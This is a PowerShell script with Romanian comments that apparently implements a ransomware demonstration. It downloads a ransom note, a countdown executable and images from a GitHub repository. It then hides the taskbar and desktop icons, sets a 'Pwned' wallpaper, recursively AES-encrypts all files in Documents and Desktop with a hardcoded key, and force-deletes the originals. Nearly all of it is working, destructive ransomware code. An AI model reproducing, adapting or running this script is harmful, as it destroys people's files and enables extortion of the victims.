# Defineste si apeleaza o functie API de Windows pentru a ajuta la schimbarea wallpaper-ului, precum si cea de ascundere taskbar

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@


Try{

# Descarca imaginea Pwned.png
$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Pwned.png"
$output = "$env:USERPROFILE\Desktop\Pwned.png"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Descarca imaginea Wallpaper.jpg
$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Wallpaper.jpg"
$output = "$env:USERPROFILE\Desktop\Wallpaper.jpg"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Descarca fisierul Countdown.exe
$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Countdown.exe"
$output = "$env:USERPROFILE\Desktop\Countdown.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Descarca fisierul Ransom.txt
$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Ransom.txt"
$output = "$env:USERPROFILE\Desktop\Ransom.txt"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Descarca fisierul Unscript.ps1
$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Unscript.ps1"
$output = "$env:USERPROFILE\Desktop\Unscript.ps1"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Minimizeaza toate aplicatiile care ruleaza
$shell = New-Object -ComObject Shell.Application
$shell.MinimizeAll()

# Ascunde icons de pe desktop
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 1

# Restart Explorer
Stop-Process -ProcessName explorer -Force
Start-Process explorer

# Inchide noua instanta de Windows Explorer
$wex = New-Object -ComObject wscript.shell;
Sleep 1
$wex.SendKeys('%{F4}')
Sleep 2

# Ascunde taskbar
$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)

# Seteaza imaginea descarcata ca desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "$env:USERPROFILE\Desktop\Pwned.png" , 3)


##Encriptie

# Defineste cale encriptie
$MyDocuments = [Environment]::GetFolderPath('MyDocuments')
$Desktop = [Environment]::GetFolderPath('Desktop')

# Cheia de encriptie
$EncryptionKey = "MyAESEncryptionKey999"

# Functie de generare cheie AES din parola
function Get-AesKey {
    param (
        [string]$Password
    )

    # Converteste parola in byte array
    $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)

    # Hash-eaza parola pentru a genera o cheie
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $key = $sha256.ComputeHash($passwordBytes)
    return $key
}

# Functia de encriptie a unui fisier
function Encrypt-File {
    param (
        [string]$FilePath,
        [string]$Key
    )

    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = Get-AesKey -Password $Key
    $aes.GenerateIV()

    $iv = $aes.IV
    $encryptor = $aes.CreateEncryptor()

    $inputBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $outputBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)

    # Combina Vectorii de Initializare si datele criptate
    $outputBytesWithIv = $iv + $outputBytes

    # Scrie fisierul criptat
    [System.IO.File]::WriteAllBytes($FilePath + ".rsm", $outputBytesWithIv)

    Write-Host "Fisier criptat: $FilePath.encrypted"

    # Sterge fisierul original dupa encriptie
    Remove-Item -Path $FilePath -Force
    Write-Host "Fisier original sters: $FilePath"
}

# Cripteaza recursiv toate fisierele din folderele "My Documents" si "Desktop", precum si din toate subfolderele
$files = Get-ChildItem -Path $MyDocuments -Recurse -File
$files1 = Get-ChildItem -Path $Desktop -Recurse -File

foreach ($file in $files) {
    $filePath = $file.FullName
    Encrypt-File -FilePath $filePath -Key $EncryptionKey
}

foreach ($file in $files1) {
    $filePath = $file.FullName
    Encrypt-File -FilePath $filePath -Key $EncryptionKey
}

}

# Handler de erori
Catch {"Scriptul a returnat eroare"}
